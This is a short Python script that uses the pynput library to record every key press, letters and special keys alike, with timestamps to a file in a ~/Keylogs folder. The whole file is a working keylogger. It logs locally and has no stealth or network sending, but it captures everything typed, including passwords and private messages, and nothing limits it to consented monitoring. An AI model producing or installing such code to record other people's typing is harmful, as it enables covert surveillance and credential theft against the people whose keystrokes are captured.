from pynput.keyboard import Key, Listener
import logging
import os

# Set the directory where keystroke logs will be saved
log_dir = os.path.expanduser("~/Keylogs")

# Ensure the log directory exists
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Define the full file path for keylogs.txt
log_file = os.path.join(log_dir, "keylogs.txt")

# Configuring the logging to save keystrokes into the file
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)


# Function to log key presses
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")  # Logs alphanumeric characters
    except AttributeError:
        logging.info(f"Special key pressed: {key}")  # Logs special keys (e.g., Shift, Ctrl)


# Start the keyboard listener
with Listener(on_press=on_press) as listener:
    listener.join()
